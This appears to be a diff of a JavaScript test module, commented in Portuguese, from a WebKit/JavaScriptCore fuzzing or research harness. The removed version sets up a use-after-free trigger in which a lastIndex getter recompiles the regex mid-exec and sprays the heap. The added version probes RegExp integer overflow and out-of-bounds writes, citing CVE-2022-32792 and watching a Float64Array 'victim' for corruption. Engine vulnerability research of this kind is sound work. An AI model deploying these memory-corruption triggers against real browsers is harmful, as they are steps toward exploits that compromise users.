@@ -1,70 +1,121 @@
+/**
+ * SC_REGEXP_OVERFLOW.JS
+ * Categoria : JS ENGINE — Integer Overflow / OOB Read
+ * Alvo      : JSC RegExp match array / named capture groups
+ * Técnica   : Constrói RegExps com número extremo de grupos de captura,
+ *             listas de alternativas e lookbehind recursivo para
+ *             pressionar o alocador de resultados do JSC. Um overflow
+ *             no cálculo de `lastIndex` ou no tamanho do array de match
+ *             pode resultar em OOB read/write no Butterfly.
+ * Referência: CVE-2022-32792 (WebKit JSC RegExp OOB)
+ */
+
 export default {
-    id:       'REGEXP_MUTATION_UAF',
-    category: 'CoreJS',
-    risk:     'CRITICAL',
-    description:
-        'Type Confusion / UAF no motor RegExp C++. Abusa do getter da propriedade lastIndex ' +
-        'para forçar a recompilação da Regex (RegExp.compile) a meio da execução do método exec(). ' +
-        'O motor tenta operar com Bytecode que acabou de ser libertado (freed) da memória.',
+    id:          'REGEXP_INT_OVERFLOW',
+    category:    'JS ENGINE',
+    risk:        'HIGH',
+    description: 'RegExp com grupos extremos pressiona o alocador JSC. '
+                + 'Testa overflow em lastIndex e tamanho do array de match.',
 
-    setup: function() {
-        this.results = {};
-        // Regex original
-        this.vulnRegex = /alvo/g;
-        const self = this;
+    /* ── estado interno ──────────────────────────────────────────────── */
+    _re:          null,
+    _reNamed:     null,
+    _matchResult: null,
+    _groups:      null,
+    _victim:      null,
 
-        // A ARMADILHA: O motor C++ chama internamente toNumber(lastIndex) antes de iniciar a busca.
-        // Injetamos um objeto maligno com um getter (valueOf) disfarçado de número!
-        this.vulnRegex.lastIndex = {
-            valueOf: function() {
-                // O GATILHO: Recompilamos a regex síncronamente.
-                // O WebKit liberta o Bytecode original da memória C++ para criar o novo!
-                self.vulnRegex.compile("lixo", "g");
-
-                // Pressionamos o Heap para tentar escrever por cima do Bytecode antigo
-                let trash = [];
-                for(let i = 0; i < 500; i++) {
-                    trash.push([0x1337, 13.37]);
-                }
-                self.trash = trash;
-
-                return 0; // Devolve 0 para o exec() continuar a leitura na memória morta
-            }
-        };
+    supported: function() {
+        try { new RegExp('(?<a>x)'); return true; }
+        catch(_) { return false; }
     },
 
-    trigger: function() {
+    /* ── setup ──────────────────────────────────────────────────────── */
+    setup: async function() {
+        this._matchResult = null;
+        this._groups      = null;
+
+        // Array vítima adjacente no heap
+        this._victim = new Float64Array(16);
+        this._victim.fill(1.1111111111111);
+
+        // RegExp com muitos grupos de captura nomeados
+        const namedGroups = Array.from({ length: 100 }, (_, i) => `(?<g${i}>\\w?)`).join('');
         try {
-            // Inicia a execução. Vai tropeçar na nossa armadilha do lastIndex!
-            this.results.match = this.vulnRegex.exec("alvo alvo");
-        } catch(e) {
-            this.results.error = e.message;
-        }
+            this._reNamed = new RegExp(namedGroups + '(.*)');
+        } catch(_) {}
+
+        // RegExp com alternativas aninhadas profundas
+        let altPattern = 'a';
+        for (let i = 0; i < 12; i++) altPattern = `(${altPattern}|${'b'.repeat(i+1)})`;
+        try {
+            this._re = new RegExp(altPattern, 'g');
+        } catch(_) {}
+
+        await new Promise(r => setTimeout(r, 0));
     },
 
+    /* ── trigger ─────────────────────────────────────────────────────── */
+    trigger: async function() {
+        // 1) Executa com string longa para pressionar o array de match
+        const longStr = 'a'.repeat(10000) + 'b'.repeat(10000);
+        try {
+            this._matchResult = this._re?.exec(longStr) ?? null;
+        } catch(_) {}
+
+        // 2) Grupos nomeados com input huge
+        try {
+            const m = this._reNamed?.exec('x'.repeat(200));
+            this._groups = m?.groups ? Object.keys(m.groups).length : 0;
+        } catch(_) {}
+
+        // 3) lastIndex overflow — define como 2^32-1 e executa
+        try {
+            const reSticky = /(\w+)/sy;
+            reSticky.lastIndex = 0xFFFFFFFF;
+            reSticky.exec('test overflow boundary');
+        } catch(_) {}
+
+        // 4) String.prototype.replace com função e muitos grupos
+        try {
+            const rReplace = /(\w)(\w)(\w)(\w)(\w)(\w)(\w)(\w)/g;
+            'abcdefghijklmnopqrstuvwxyz'.repeat(400).replace(rReplace,
+                (...args) => args.slice(1, -2).join('')
+            );
+        } catch(_) {}
+
+        await new Promise(r => setTimeout(r, 0));
+    },
+
+    /* ── probes ──────────────────────────────────────────────────────── */
     probe: [
-        // Probe 0: O motor crascha, atira TypeError ou engole a corrupção?
-        s => s.results.error || 'Execução Concluída',
-        
-        // Probe 1: O Extrator de STALE DATA
-        s => {
-            if (s.results.match !== null && s.results.match !== undefined) {
-                // Se ele devolveu um array de resultados, vamos ver o que ele encontrou.
-                // Se for 'alvo' ou 'lixo', a mitigação do C++ funcionou.
-                // Se for outra coisa, ele leu o nosso lixo da RAM (Info Leak)!
-                let matchedStr = s.results.match[0];
-                if (matchedStr !== 'alvo' && matchedStr !== 'lixo') {
-                    return `💥 LEAK/CORRUPÇÃO: Motor leu -> ${matchedStr}`;
-                }
-                return 0;
-            }
-            return 0; // Seguro (Devolveu Null)
-        }
+        // [0-4] resultado do match
+        s => s._matchResult?.length ?? -1,
+        s => typeof s._matchResult,
+        s => s._matchResult?.[0]?.length ?? -1,
+        s => s._matchResult?.index ?? -1,
+        s => s._groups ?? -1,
+
+        // [5-7] estado do RegExp após execução
+        s => s._re?.lastIndex ?? -1,
+        s => s._re?.source?.length ?? -1,
+        s => typeof s._re,
+
+        // [8-10] vítima Float64 — detecta OOB write silencioso
+        s => s._victim[0],
+        s => s._victim[8],
+        s => s._victim[15],
+
+        // [11-12] invariante do motor: RegExp puro não muda nada fora
+        s => s._victim.byteLength,
+        s => s._victim.every(v => Math.abs(v - 1.1111111111111) < 1e-10) ? 'clean' : 'CORRUPTED',
     ],
 
-    cleanup: function() {
-        this.vulnRegex = null;
-        this.trash = null;
-        this.results = {};
+    /* ── cleanup ─────────────────────────────────────────────────────── */
+    cleanup: async function() {
+        this._re          = null;
+        this._reNamed     = null;
+        this._matchResult = null;
+        this._groups      = null;
+        this._victim      = null;
     }
 };
